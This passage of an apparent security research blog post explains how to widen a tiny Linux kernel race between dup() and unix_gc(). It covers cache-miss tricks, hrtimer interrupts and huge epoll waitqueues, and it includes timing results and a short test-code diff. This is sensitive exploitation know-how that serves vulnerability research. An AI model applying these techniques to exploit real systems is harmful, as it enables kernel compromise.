class=\"c1\"&gt;&amp;nbsp;protocols or snooping might make a big difference.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;For the cache line containing the flags and refcount of a &lt;/span&gt;&lt;span class=\"c4\"&gt;struct file&lt;/span&gt;&lt;span&gt;, this can be done by, on another CPU, temporarily bumping its refcount up and then changing it back down, e.g. with &lt;/span&gt;&lt;span class=\"c4\"&gt;close(dup(fd))&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;(or just by accessing the FD in pretty much any way from a multithreaded process).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;However, when we&amp;#39;re trying to hit the race in &lt;/span&gt;&lt;span class=\"c4\"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;via &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span&gt;, we don&amp;#39;t want any cache misses to occur before we hit the race window - that would slow us down and probably make us miss the race. To prevent that from happening, we can call &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;with a different FD number for a warm-up run shortly before attempting the race. Because we also want the relevant cache line in the FD table to be hot, we should choose the FD number for the warm-up run such that it uses the same cache line of the file descriptor table.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.pfod85irgmms\"&gt;&lt;span class=\"c8\"&gt;An interruption&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Okay, a cache miss might be something like a few dozen or maybe hundred nanoseconds or so - that&amp;#39;s better, but it&amp;#39;s not &lt;/span&gt;&lt;span class=\"c16\"&gt;great&lt;/span&gt;&lt;span&gt;. What &lt;/span&gt;&lt;span&gt;else can we do to make this tiny&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;piece of code much slower to execute?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;On Android, kernels normally set &lt;/span&gt;&lt;span class=\"c4\"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span&gt;, which would&amp;#39;ve allowed abusing the scheduler to somehow interrupt the execution of this code. The way I&amp;#39;ve done this in the past was to give the victim thread a low scheduler priority and pin it to a specific CPU core together with another high-priority thread that is blocked on a &lt;/span&gt;&lt;span class=\"c4\"&gt;read()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;syscall on an empty pipe (or eventfd); when data is written to the pipe from another CPU core, the pipe becomes readable, so the high-priority thread (which is registered on the pipe&amp;#39;s waitqueue) becomes schedulable, and an inter-processor interrupt (IPI) is sent to the victim&amp;#39;s CPU core to force it to enter the scheduler immediately.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;One problem with that approach, aside from its reliance on &lt;/span&gt;&lt;span class=\"c4\"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span class=\"c1\"&gt;, is that any timing variability in the kernel code involved in sending the IPI makes it harder to actually preempt the victim thread in the right spot.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;(Thanks to the &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://xenproject.org/users/security/\"&gt;Xen security team&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;- I think the first time I heard the idea of using an interrupt to widen a race window might have been from them.)&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.u9iu9sq2l8r\"&gt;&lt;span&gt;Setting an alarm&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;A better way to do this on an Android phone would be to trigger the scheduler not from an IPI, but from an expiring high-resolution timer on the same core&lt;/span&gt;&lt;span&gt;, although I didn&amp;#39;t get it to work (probably because my code was broken in unrelated ways)&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;High-resolution timers (hrtimers) are exposed through many userspace APIs. Even the timeout of &lt;/span&gt;&lt;span class=\"c4\"&gt;select()&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span class=\"c4\"&gt;pselect()&lt;/span&gt;&lt;span&gt;&amp;nbsp;uses an hrtimer, although this is an hrtimer that normally has some slack applied to it to allow batching it with timers that are scheduled to expire a bit later. An example of a non-hrtimer-based API is the timeout used for reading from a UNIX domain socket (and probably also other types of sockets?), which can be set via &lt;/span&gt;&lt;span class=\"c4\"&gt;SO_RCVTIMEO&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The thing that makes hrtimers &amp;quot;high-resolution&amp;quot; is that they don&amp;#39;t just wait for the next periodic clock tick to arrive; instead, the expiration time of the next hrtimer on the CPU core is programmed into a hardware timer. So we could set an absolute hrtimer for some time in the future via something like &lt;/span&gt;&lt;span class=\"c4\"&gt;timer_settime()&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"c4\"&gt;timerfd_settime()&lt;/span&gt;&lt;span class=\"c1\"&gt;, and then at exactly the programmed time, the hardware will raise an interrupt! We&amp;#39;ve made the timing behavior of the OS irrelevant for the second side of the race, the only thing that matters is the hardware! Or... well, almost...&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.v6rvu85hdhx3\"&gt;&lt;span class=\"c8\"&gt;[Sidenote] Absolute timers: Not quite absolute&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;So we pick some absolute time at which we want to be interrupted, and tell the kernel using a syscall that accepts an absolute time, in nanoseconds. And then when that timer is the next one scheduled, the OS converts the absolute time to whatever clock base/scale the hardware timer is based on, and programs it into hardware. And the hardware usually supports programming timers with absolute time - e.g. on modern X86 (with &lt;/span&gt;&lt;span class=\"c4\"&gt;X86_FEATURE_TSC_DEADLINE_TIMER&lt;/span&gt;&lt;span&gt;), you can simply write an absolute Time Stamp Counter(TSC) deadline into &lt;/span&gt;&lt;span class=\"c4\"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span&gt;, and when that deadline is reached, you get an interrupt. The situation on arm64 is similar, using the timer&amp;#39;s comparator register (&lt;/span&gt;&lt;span class=\"c4\"&gt;CVAL&lt;/span&gt;&lt;span class=\"c1\"&gt;).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;However, on both X86 and arm64, even though the clockevent subsystem is theoretically able to give absolute timestamps to clockevent drivers (via &lt;/span&gt;&lt;span class=\"c4\"&gt;-&amp;gt;set_next_ktime()&lt;/span&gt;&lt;span&gt;), the drivers instead only implement &lt;/span&gt;&lt;span class=\"c4\"&gt;-&amp;gt;set_next_event()&lt;/span&gt;&lt;span class=\"c1\"&gt;, which takes a relative time as argument. This means that the absolute timestamp has to be converted into a relative one, only to be converted back to absolute a short moment later. The delay between those two operations is essentially added to the timer&amp;#39;s expiration time.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Luckily this didn&amp;#39;t really seem to be a problem for me; if it was, I would have tried to repeatedly call &lt;/span&gt;&lt;span class=\"c4\"&gt;timerfd_settime()&lt;/span&gt;&lt;span&gt;&amp;nbsp;shortly before the planned expiry time to ensure that the last time the hardware timer is programmed, the relevant code path is hot in the caches. (I did do some experimentation on arm64, where this seemed to &lt;/span&gt;&lt;span class=\"c16\"&gt;maybe&lt;/span&gt;&lt;span&gt;&amp;nbsp;help a tiny bit, but I didn&amp;#39;t really analyze it properly.)&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.dtkpi9hjsrrs\"&gt;&lt;span class=\"c8\"&gt;A really big list of things to do&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Okay, so all the stuff I said above would be helpful on an Android phone with &lt;/span&gt;&lt;span class=\"c4\"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span class=\"c1\"&gt;, but what if we&amp;#39;re trying to target a normal desktop/server kernel that doesn&amp;#39;t have that turned on?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;Well, we can still trigger hrtimer interrupts the same way - we just can&amp;#39;t use them to immediately enter the scheduler and preempt the thread anymore. But instead of using the interrupt for preemption, we could just try to make the interrupt handler run for a really long time.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Linux has the concept of a &amp;quot;timerfd&amp;quot;, which is a file descriptor that refers to a timer. You can e.g. call &lt;/span&gt;&lt;span class=\"c4\"&gt;read()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;on a timerfd, and that operation will block until the timer has expired. Or you can monitor the timerfd using epoll, and it will show up as readable when the timer expires.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;When a timerfd becomes ready, all the timerfd&amp;#39;s waiters (including epoll watches), which are queued up in a linked list, are woken up via the &lt;/span&gt;&lt;span class=\"c4\"&gt;wake_up()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;path - just like when e.g. a pipe becomes readable. Therefore, if we can make the list of waiters really long, the interrupt handler will have to spend a lot of time iterating over that list.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;And for any waitqueue that is wired up to a file descriptor, it is fairly easy to add a ton of entries thanks to epoll. Epoll ties its watches to specific FD numbers, so if you duplicate an FD with hundreds of &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;calls, you can then use a single epoll instance to install hundreds of waiters on the file. Additionally, a single process can have lots of epoll instances. I used 500 epoll instances and 100 duplicate FDs, resulting in 50 000 waitqueue items.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.gyrfobw0uoov\"&gt;&lt;span&gt;Measuring race outcomes&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;A nice aspect of this race condition is that if you only hit the difficult race (&lt;/span&gt;&lt;span class=\"c4\"&gt;close()&lt;/span&gt;&lt;span&gt;&amp;nbsp;the FD and run &lt;/span&gt;&lt;span class=\"c4\"&gt;unix_gc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;while &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;is preempted between FD table lookup and refcount increment), no memory corruption happens yet, but you can observe that the GC has incorrectly removed a socket buffer (SKB) from the victim socket. Even better, if the race fails, you can also see in which direction it failed, as long as no FDs below the victim FD are unused:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c20 lst-kix_oh8g77k3z2ge-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c14 li-bullet-0\"&gt;&lt;span&gt;If &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns -1, it was called too late / the interrupt happened too soon: The &lt;/span&gt;&lt;span class=\"c4\"&gt;file*&lt;/span&gt;&lt;span&gt;&amp;nbsp;was already gone from the FD table when &lt;/span&gt;&lt;span class=\"c4\"&gt;__fget_files()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;tried to load it.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c14 li-bullet-0\"&gt;&lt;span&gt;If &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;returns a file descriptor:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=\"padding: 0;\" class=\"c20 lst-kix_oh8g77k3z2ge-1 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c21 li-bullet-0\"&gt;&lt;span&gt;If it returns an FD higher than the victim FD, this implies that the victim FD was only closed after &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span&gt;&amp;nbsp;had already elevated the refcount and allocated a new FD. This means &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;was called too soon / the interrupt happened too late.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c21 li-bullet-0\"&gt;&lt;span class=\"c1\"&gt;If it returns the old victim FD number:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=\"padding: 0;\" class=\"c20 lst-kix_oh8g77k3z2ge-2 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c17 li-bullet-0\"&gt;&lt;span&gt;If &lt;/span&gt;&lt;span class=\"c4\"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the FD returned by &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;returns no data, it means the race succeeded: The GC wrongly removed the queued SKB.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c17 li-bullet-0\"&gt;&lt;span&gt;If &lt;/span&gt;&lt;span class=\"c4\"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns data, the interrupt happened between the refcount increment and the allocation of a new FD. &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;was called a little bit too soon / the interrupt happened a little bit too late.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;Based on this, I repeatedly tested different timing offsets, using a spinloop with a variable number of iterations to skew the timing, and plotted what outcomes the race attempts had depending on the timing skew.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.8e0qhvge46uf\"&gt;&lt;span class=\"c22 c23\"&gt;Results: Debian kernel, on Tiger Lake&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;I tested this on a Tiger Lake laptop, with the same kernel as shown in the disassembly. Note that &amp;quot;0&amp;quot; on the X axis is offset -300 ns relative to the timer&amp;#39;s programmed expiry.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxGtaXjmnSP7rJxi3RT9dLvnD5tGCVK-JFz8h3JVDjIDQ_2j-MpgyVqVJjh4zsldFBzadavB4_9nLx9KQ_fMSRHksfZM807yXykEgetDNCmeOzM21njTe8H9qH79Kz2MgqNL-5XWbxMy5fj9NamgjI15-5QZwJyn0NvHQwFuAw2z99_0lKwfrcWm4a/s580/image12.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxGtaXjmnSP7rJxi3RT9dLvnD5tGCVK-JFz8h3JVDjIDQ_2j-MpgyVqVJjh4zsldFBzadavB4_9nLx9KQ_fMSRHksfZM807yXykEgetDNCmeOzM21njTe8H9qH79Kz2MgqNL-5XWbxMy5fj9NamgjI15-5QZwJyn0NvHQwFuAw2z99_0lKwfrcWm4a/s580/image12.png\" border=\"0\" alt=\"This graph shows histograms of race attempt outcomes (too early, success, or too late), with the timing offset at which the outcome occurred on the X axis. The graph shows that depending on the timing offset, up to around 1/3 of race attempts succeeded.\" style=\"max-height: 750; max-width: 600px;\"title=\"This graph shows histograms of race attempt outcomes (too early, success, or too late), with the timing offset at which the outcome occurred on the X axis. The graph shows that depending on the timing offset, up to around 1/3 of race attempts succeeded.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.9b7pdk4c8xov\"&gt;&lt;span&gt;Results: Other kernel, on Skylake&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjer2duEFeMBnPTJc3X7kT-FPCR1yx9UFEABwrTUxFKOs-gFkM_N-XnkWxPbhg31yka-2b5CFBBnOeAmrVAr41WfzKKPUBoF1dDBRpaX0tPGpu4w8p5aBZrxewYuGl1A_CDt0CojQqK44ue86r9PI8HnBtD2IR3NJDAI8O4TByvvx5fFe0sMdmHYZ6b/s652/image8%283%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjer2duEFeMBnPTJc3X7kT-FPCR1yx9UFEABwrTUxFKOs-gFkM_N-XnkWxPbhg31yka-2b5CFBBnOeAmrVAr41WfzKKPUBoF1dDBRpaX0tPGpu4w8p5aBZrxewYuGl1A_CDt0CojQqK44ue86r9PI8HnBtD2IR3NJDAI8O4TByvvx5fFe0sMdmHYZ6b/s652/image8%283%29.png\" border=\"0\" alt=\"This graph shows similar histograms for a Skylake processor. The exact distribution is different, but again, depending on the timing offset, around 1/3 of race attempts succeeded.\" style=\"max-height: 750; max-width: 600px;\"title=\"This graph shows similar histograms for a Skylake processor. The exact distribution is different, but again, depending on the timing offset, around 1/3 of race attempts succeeded.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;These measurements are from an older laptop with a Skylake CPU, running a different kernel. Here &amp;quot;0&amp;quot; on the X axis is offset -1 us relative to the timer. (T&lt;/span&gt;&lt;span&gt;hese timings are from a system that&amp;#39;s running a different kernel from &lt;/span&gt;&lt;span class=\"c1\"&gt;the one shown above, but I don&amp;#39;t think that makes a difference.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;The exact timings of course look different between CPUs, and they probably also change based on CPU frequency scaling? But still, if you know what the right timing is (or measure the machine&amp;#39;s timing before attempting to actually exploit the bug), you could hit this narrow race with a success rate of about 30%!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.5qhkbks84bg2\"&gt;&lt;span class=\"c8\"&gt;How important is the cache miss?&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The previous section showed that with the right timing, the race succeeds with a probability around 30% - but it doesn&amp;#39;t show whether the cache miss is actually important for that, or whether the race would still work fine without it. To verify that, I patched my test code to try to make the file&amp;#39;s &lt;/span&gt;&lt;span&gt;cache line hot (present in the cache) instead of cold (not present in the cache):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;@@ -312,8 +312,10 @@&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;+#if 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;// bounce socket&amp;#39;s file refcount over to other cpu&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;pin_to(2);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;close(SYSCHK(dup(RESURRECT_FD+1-1)));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c10\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;pin_to(1);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;+#endif&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c24\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;//printf(&amp;quot;setting timer\\n&amp;quot;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;@@ -352,5 +354,5 @@&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;close(loop_root);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;while (ts_is_in_future(spin_stop))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;- &amp;nbsp; &amp;nbsp; &amp;nbsp;close(SYSCHK(dup(FAKE_RESURRECT_FD)));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp;close(SYSCHK(dup(RESURRECT_FD)));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;while (ts_is_in_future(my_launch_ts)) /*spin*/;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;With that patch, the race outcomes look like this on the Tiger Lake laptop:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n \n \n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7ABFgzZ7f8Mx5-JqYX4cjg23oXIbYr90vK32VO2evlWS2ADk3IM_Oh7AqguoJOEkF2A20aBhazVB5YqC7w5HgdmW73YqBhepK02B_EpBU0MSmbSIanUrFQwZizZAyF1cp2UNMMfG2xd_Z5byu2kqFejEuzWJ26piIR-0qY_uSGlfSfYmfq9SvLp9Z/s659/image2%284%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7ABFgzZ7f8Mx5-JqYX4cjg23oXIbYr90vK32VO2evlWS2ADk3IM_Oh7AqguoJOEkF2A20aBhazVB5YqC7w5HgdmW73YqBhepK02B_EpBU0MSmbSIanUrFQwZizZAyF1cp2UNMMfG2xd_Z5byu2kqFejEuzWJ26piIR-0qY_uSGlfSfYmfq9SvLp9Z/s659/image2%284%29.png\" border=\"0\" alt=\"This graph is a histogram of race outcomes depending on timing offset; it looks similar to the previous graphs, except that almost no race attempts succeed anymore.\" style=\"max-height: 750; max-width: 600px;\"title=\"This graph is a histogram of race outcomes depending on timing offset; it looks similar to the previous graphs, except that almost no race attempts succeed anymore.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.7bhmtfdoxeqe\"&gt;&lt;span class=\"c8\"&gt;But wait, those graphs make no sense!&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;If you&amp;#39;ve been paying attention, you may have noticed that the timing graphs I&amp;#39;ve been showing are really weird. If we were deterministically hitting the race in exactly the same way every time, the timing graph should look like this (looking just at the &amp;quot;too-early&amp;quot; and &amp;quot;too-late&amp;quot; cases for simplicity):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6T1QCwcnTS3XMWs-pRes47xC-6ruTCFYUU9ZxoO-OYZs3BX3Je5ZxXllb-obFMJsGo9ueKu6y5e5CorRtrVbIHf4YIWAGrLV7Gz3wRS-QzF1UG3AxK__fRQ-PC6MkCnxH3dlKDG5ueJR8bITiorTkicLIhYJg910YC3fY5_m4sf64GYWtOnIPbKDE/s359/image6%283%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6T1QCwcnTS3XMWs-pRes47xC-6ruTCFYUU9ZxoO-OYZs3BX3Je5ZxXllb-obFMJsGo9ueKu6y5e5CorRtrVbIHf4YIWAGrLV7Gz3wRS-QzF1UG3AxK__fRQ-PC6MkCnxH3dlKDG5ueJR8bITiorTkicLIhYJg910YC3fY5_m4sf64GYWtOnIPbKDE/s359/image6%283%29.png\" border=\"0\" alt=\"A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome suddenly drops from 100% probability to 0% probability, and a bit afterwards, the &amp;quot;too late&amp;quot; outcome jumps from 0% probability to 100%\" style=\"max-height: 750; max-width: 600px;\"title=\"A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome suddenly drops from 100% probability to 0% probability, and a bit afterwards, the &amp;quot;too late&amp;quot; outcome jumps from 0% probability to 100%\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;Sure, maybe there is some microarchitectural state that is different between runs, causing timing variations - cache state, branch predictor state, frequency scaling, or something along those lines -, but a small number of discrete events that haven&amp;#39;t been accounted for should be adding steps to the graph. (If you&amp;#39;re mathematically inclined, you can model that as the result of a convolution of the ideal timing graph with the timing delay distributions of individual discrete events.) For two unaccounted events, that might look like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2Y9DapfGb7NRtbz3j0aEQlA4SLZgk1ttbc7rS-0ZPbgerGJlqgk-N_Bna8AfcY8J2HBaHo2VJ0x-AR5n9lvivwdjmzKkITRIcypqYSBkOXB0DpavJ9dURyIfbA0u0D0KUOU1JD2pIH8KW2f8AQffaWluuQayXFq_8bleRLPfLZHmAkeLjFbJXxDVA/s359/image18.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img 